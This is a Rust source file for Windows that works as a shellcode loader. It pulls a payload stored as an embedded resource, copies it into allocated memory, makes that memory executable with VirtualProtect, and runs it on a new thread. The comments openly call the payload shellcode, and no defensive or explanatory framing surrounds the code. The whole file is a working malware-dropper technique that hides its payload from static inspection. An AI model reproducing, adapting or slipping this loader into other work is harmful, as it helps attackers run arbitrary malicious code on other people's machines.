use windows::core::PCSTR;
use windows::Win32::Foundation::{
                                HRSRC,
                                HGLOBAL,
                                HANDLE,
                                GetLastError,
                                };
use windows::Win32::System::LibraryLoader::{FindResourceA,
                                            LoadResource,
                                            LockResource,
                                            SizeofResource
                                            };
use windows::Win32::System::Memory::{
                                     VirtualAlloc,
                                     VirtualProtect,
                                     MEM_COMMIT,
                                     PAGE_READWRITE,
                                     MEM_RESERVE,
                                     PAGE_EXECUTE_READ,
                                     PAGE_PROTECTION_FLAGS
                                    };

use windows::Win32::System::Threading::{
                                        CreateThread, 
                                        WaitForSingleObject, 
                                        THREAD_CREATION_FLAGS,
                                        INFINITE,
                                    };
use std::ptr::{
               null_mut,
               copy
               };
use std::mem::transmute;

fn error(msg: &str) {
    unsafe{
        println!("{}: {:?}",msg, GetLastError());
        // remember you can use 'net helpmsg 998' to look at the error code
    }
    return;
}

fn makeintresource(id: u16) -> PCSTR {
    PCSTR(id as usize as *const u8)
}

fn main() {
    let mut lp_old_protect= PAGE_PROTECTION_FLAGS(0);
    unsafe{

        // Find the shellcode as a resource
        let resource = match FindResourceA(None,
                                                    makeintresource(101),
                                                    makeintresource(10)){
            Ok(resource) => resource,
            Err(_e) => {
                println!("Could not find Resource!");
                HRSRC(null_mut());
                return;
            }
        };

        // Get a handle on the resource
        let resource_handle = match LoadResource(None,
                                                         resource){
            Ok(resource_handle) => resource_handle,
            Err(_e) =>{
                println!("Could not LoadResource!");
                HGLOBAL(null_mut());
                return;
            }
        };

        // get a ptr for the resource
        let resource_ptr = LockResource(resource_handle);

        // Get size of the resource so we can allocate space for it
        let resource_size = SizeofResource(None, resource);

        // Allocate a new memory buffer for shellcode
        let memory_buffer = VirtualAlloc(None,
                                                        resource_size as usize,
                                                        MEM_COMMIT | MEM_RESERVE,
                                                        PAGE_READWRITE);

        if memory_buffer.is_null(){
            return error("Failed to VirtualAlloc:");
        }

        // Move shellcode from resource to newly allocated buffer
        copy(resource_ptr,memory_buffer,resource_size as usize);

        // Make shellcode executable
        let _exec_priv = match VirtualProtect(memory_buffer,
                                                    resource_size as usize,
                                                    PAGE_EXECUTE_READ,
                                                    &mut lp_old_protect){
            Ok(exec_priv) => exec_priv,
            Err(_e) =>{
                error("VirtualProtect Failed!");
                return;
            }
        };

        // Create new thead to execute shellcode
        let thread_handle = match CreateThread(None,
                                            0,
                                            transmute(memory_buffer),
                                            None,
                                            THREAD_CREATION_FLAGS(0),
                                            None){
            Ok(thread_handle) => thread_handle,
            Err(_e) => {
                error("Failed to get thread handle");
                HANDLE(null_mut())
            }
        };

        // Wait for thread to finish before exiting
        WaitForSingleObject(thread_handle, INFINITE);
    }
}

